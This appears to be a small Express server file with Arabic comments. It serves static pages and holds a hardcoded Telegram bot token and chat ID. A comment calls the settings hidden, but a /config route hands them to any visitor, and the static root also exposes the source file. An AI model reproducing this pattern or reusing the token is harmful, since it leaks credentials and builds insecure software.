// server.js
const express = require('express');
const app = express();
const port = 3000;

// إعدادات البوت (مخفية عن المتصفح)
const botConfig = {
        botToken: '6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w',
  chatId: '7057346640'
};

// تقديم ملفات المشروع
app.use(express.static(__dirname));

// إرسال صفحات HTML
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.get('/other-page', (req, res) => {
  res.sendFile(__dirname + '/other-page.html');
});

// 🎯 إرسال إعدادات البوت بشكل ديناميكي
app.get('/config', (req, res) => {
  res.json(botConfig);
});

app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
